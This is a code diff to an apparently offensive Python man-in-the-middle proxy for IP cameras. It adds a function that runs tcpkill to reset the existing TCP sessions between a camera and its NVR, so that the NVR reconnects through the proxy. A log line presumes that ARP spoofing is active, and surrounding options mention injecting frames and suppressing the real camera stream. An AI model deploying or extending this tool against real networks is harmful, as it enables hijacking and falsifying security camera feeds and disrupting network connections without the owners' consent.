@@ -621,6 +621,55 @@ class MITMProxy:
             self._stop.set()
 
 
+import subprocess
+import shutil
+
+def tcpkill_existing_session(camera_host: str, camera_port: int, iface: str):
+    """
+    Kills all TCP sessions between camera and NVR to force reconnection through the proxy.
+    """
+    tcpkill_cmd = shutil.which("tcpkill")
+    tcpdump_cmd = shutil.which("tcpdump")
+
+    if not tcpkill_cmd:
+        log.error("tcpkill not found. Install dsniff: sudo apt install dsniff")
+        return
+
+    log.info("tcpkill -> verifying traffic on %s...", iface)
+
+    # Verificar tráfico (opcional, si tcpdump está disponible)
+    if tcpdump_cmd:
+        try:
+            check = subprocess.run(
+                [tcpdump_cmd, "-i", iface, "-c", "3", "--immediate-mode",
+                 f"host {camera_host} and port {camera_port}"],
+                timeout=5,
+                capture_output=True,
+            )
+            if check.returncode != 0:
+                log.warning("tcpkill -> no traffic seen in %s. Is ARP Spoof active?", iface)
+        except Exception as e:
+            log.warning("tcpkill -> tcpdump error: %s. Proceeding anyway.", e)
+    else:
+        log.warning("tcpdump not found, skipping traffic verification.")
+
+    filter_expr = f"host {camera_host} and port {camera_port}"
+    log.info("tcpkill -> killing session: %s", filter_expr)
+
+    try:
+        proc = subprocess.Popen(
+            [tcpkill_cmd, "-9", "-i", iface, filter_expr],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        time.sleep(2)  # Esperar a que los RST lleguen
+        proc.terminate()
+        log.info("tcpkill -> complete, waiting for NVR to reconnect...")
+        time.sleep(2)
+    except Exception as e:
+        log.error("tcpkill failed: %s", e)
+
+
 # ──────────────────────────────────────────────────────────────────────────────
 # Listener / accept loop
 # ──────────────────────────────────────────────────────────────────────────────
@@ -636,6 +685,13 @@ def serve(args: argparse.Namespace):
         args.camera_host, args.camera_port,
         args.mode,
     )
+
+    if args.tcpkill_iface is not None:
+        def kill_at_start():
+            time.sleep(args.tcpkill_delay)
+            log.info("tcpkill -> forcing reconnection to capture existing session...")
+            tcpkill_existing_session(args.camera_host, args.camera_port, args.tcpkill_iface)
+        threading.Thread(target=kill_at_start, daemon=True).start()
 
     # Pre-load capture frames for inject mode.
     inject_frames: Optional[List[Tuple[int, bytes]]] = None
@@ -740,6 +796,10 @@ def parse_args():
                     help="In inject mode, suppress the real camera stream; send only injected frames downstream.")
     ap.add_argument("--pt", type=int, default=None,
                     help="RTP Payload Type to use for injection (auto-detect if not specified)")
+    ap.add_argument("--tcpkill-iface", default=None,
+                    help="Interface to kill existing RTSP connection. E.g: eth0")
+    ap.add_argument("--tcpkill-delay", type=float, default=2.0,
+                    help="Seconds to wait after first connection before killing (default: 2)")
 
     # Misc
     ap.add_argument("--log-level", default="INFO",
